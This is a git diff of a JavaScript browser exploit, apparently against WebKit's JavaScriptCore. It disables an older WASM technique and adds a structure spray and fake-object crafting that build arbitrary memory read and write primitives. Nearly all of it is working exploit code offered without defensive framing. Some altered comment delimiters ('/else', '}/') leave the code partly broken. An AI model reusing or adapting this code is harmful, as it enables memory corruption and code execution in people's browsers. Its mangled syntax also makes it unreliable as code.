@@ -710,6 +710,8 @@ b.process = (inputs, outputs, parameters)=>{
 }
         fuck.port.postMessage("starting")
         print1("[*] Spraying structures to get a butterfly (1/2)...");
+        //RIPPPPPPPPPP
+        /*
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
         var structs = [];
@@ -799,9 +801,9 @@ b.process = (inputs, outputs, parameters)=>{
             }
         }
             print1("[+] Successfully got fakeobj as WASMObject");
-    } /*else {
+    } /else {
         print1('[+] Successfully got fakeobj as WASMObject');
-    }*/
+    }/
         //print1('[+] Successfully got fakeobj as WASMObject');
         var wasmMemRawAddr = addrof(wasmInternalMemory);
         var wasmMem = fakeobj(wasmMemRawAddr+16);    
@@ -852,7 +854,7 @@ b.process = (inputs, outputs, parameters)=>{
         /*for (var z = 0; z < 10000; z++) {
             var chewjittime = [0x7fff000000000000];
             chewjittime[1] = {a:0x41312111};
-        }*/
+        }/
         var leakerWriter = createObjWriter(leaker);
         wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
         wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
@@ -965,6 +967,123 @@ b.process = (inputs, outputs, parameters)=>{
             }
            },
         }
+        */ //RIPPPPPPPPP Technique fuck you gigacage :(
+         // verify basic exploit primitives work.
+    var addr = addrof({p: 0x1337});
+    if(fakeobj(addr).p == 0x1337) {
+    print1('[+] exploit primitives working');
+    }
+
+
+    // from saelo: spray structures to be able to predict their IDs.
+    // from Auxy: I am not sure about why spraying. i change the code to:
+    //
+    // var structs = []
+    // var i = 0;
+    // var abc = [13.37];
+    // abc.pointer = 1234;
+    // abc['prop' + i] = 13.37;
+    // structs.push(abc);
+    // var victim = structs[0];
+    //
+    // and the payload still work stablely. It seems this action is redundant
+    var structs = []
+    for (var i = 0; i < 0x1000; ++i) {
+        var array = [13.37];
+        array.pointer = 1234;
+        array['prop' + i] = 13.37;
+        structs.push(array);
+    }
+
+    // take an array from somewhere in the middle so it is preceeded by non-null bytes which
+    // will later be treated as the butterfly length.
+    var victim = structs[0x800];
+    print1(`[+] victim @ ${addrof(victim)}`);
+
+    // craft a fake object to modify victim
+    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
+    var container = {
+        header: flags_double_array,
+        butterfly: victim
+    };
+
+    // create object having |victim| as butterfly.
+    var containerAddr = addrof(container);
+    print1(`[+] container @ ${containerAddr}`);
+    // add the offset to let compiler recognize fake structure
+    var hax = fakeobj(Add(containerAddr, 0x10));
+    // origButterfly is now based on the offset of **victim** 
+    // because it becomes the new butterfly pointer
+    // and hax[1] === victim.pointer
+    var origButterfly = hax[1];
+
+    var memory = {
+        addrof: addrof,
+        fakeobj: fakeobj,
+
+        // Write an int64 to the given address.
+        writeInt64(addr, int64) {
+            hax[1] = Add(addr, 0x10).asDouble();
+            victim.pointer = int64.asJSValue();
+        },
+
+        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
+        write16(addr, value) {
+            // Set butterfly of victim object and dereference.
+            hax[1] = Add(addr, 0x10).asDouble();
+            victim.pointer = value;
+        },
+
+        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
+        write(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write16(Add(addr, 2 * i), ints[i]);
+        },
+
+        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
+        read64(addr) {
+            // Set butterfly of victim object and dereference.
+            hax[1] = Add(addr, 0x10).asDouble();
+            return this.addrof(victim.pointer);
+        },
+
+        // Verify that memory read and write primitives work.
+        test() {
+            var v = {};
+            var obj = {p: v};
+
+            var addr = this.addrof(obj);
+            if(this.fakeobj(addr).p == v){
+                print1("addrof and/or fakeobj does not work");
+            }
+
+            var propertyAddr = Add(addr, 0x10);
+
+            var value = this.read64(propertyAddr);
+            if(value.asDouble() == addrof(v).asDouble()) {
+                print1("read64 does not work");
+            }
+
+            this.write16(propertyAddr, 0x1337);
+            if(obj.p == 0x1337) {
+                print1("write16 does not work");
+            }
+        },
+    };
+
+    // Testing code, not related to exploit
+    var plainObj = {};
+    var header = memory.read64(addrof(plainObj));
+    memory.writeInt64(memory.addrof(container), header);
+    memory.test();
+    print1("[+] limited memory read/write working");
+        
         stage = "parsecache";
         return true;
     }
